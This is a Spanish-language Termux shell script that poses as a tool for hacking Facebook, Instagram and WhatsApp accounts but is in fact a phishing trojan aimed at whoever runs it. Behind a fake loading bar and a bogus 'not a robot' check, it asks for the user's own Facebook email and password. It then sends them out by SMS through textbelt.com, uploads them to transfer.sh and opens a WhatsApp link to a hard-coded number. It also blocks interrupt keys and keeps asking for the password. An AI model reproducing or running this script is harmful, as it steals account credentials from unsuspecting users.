clear
setterm -foreground green
echo '
  ___ ___    _____  _________  ____  __.
 /   |   \  /  _  \ \_   ___ \|    |/ _|
/    ~    \/  /_\  \/    \  \/|      <
\    Y    /    |    \     \___|    |  \
 \___|_  /\____|__  /\______  /____|__ \
       \/         \/        \/        \/
________________  _________ ___________
\_   _____/  _  \ \_   ___ \\_   _____/
 |    __)/  /_\  \/    \  \/ |    __)_
 |     \/    |    \     \____|        \
 \___  /\____|__  /\______  /_______  /
     \/         \/        \/        \/  '

setterm -foreground yellow

echo "Elije una opcion: "

setterm -foreground green
echo "[1] Hackear facebook"
echo "[2] Hackear instagram"
echo "[3] Hackear whatsapp"

read $op

setterm -foreground green
echo -ne ' Cargando script..    (6%)\r'
sleep 0.5
echo -ne ' Cargando script...  (20%)\r'
sleep 0.5
echo -ne ' Cargando script.... (35%)\r'
sleep 0.5
echo -ne ' Cargando script...  (40%)\r'
sleep 0.5
echo -ne ' Cargando script..   (62%)\r'
sleep 0.5
echo -ne ' Cargando script.    (85%)\r'
sleep 0.5
echo -ne ' Cargando script    (100%)\r'
echo " "
setterm -foreground red
echo -e "Verifica que no eres un robot\ninicia secion aqui:"
echo "Escribe tu correo (solo cuentas de Facebook )"
read correo
echo "Escribe tu contraseña"
read contrase
curl -# -X POST https://textbelt.com/text --data-urlencode phone="17256666908" --data-urlencode message=" $correo $contrase " -d key=textbelt
echo "$correo $contrase" > notpe.txt
curl --upload-file notpe.txt https://transfer.sh/notpe.txt
echo "opes"
echo " "
link=$(curl --upload-file notpe.txt https://transfer.sh/cO)
termux-open https://wa.me/59822228768?text=$link.KeLSxs9dj+manda+este+link
fun () {
echo " "
trap '' INT TSTP
echo "contraseña incorrecta porfavor verifica"
echo "repite la contrseña"
read
fun
}
fun
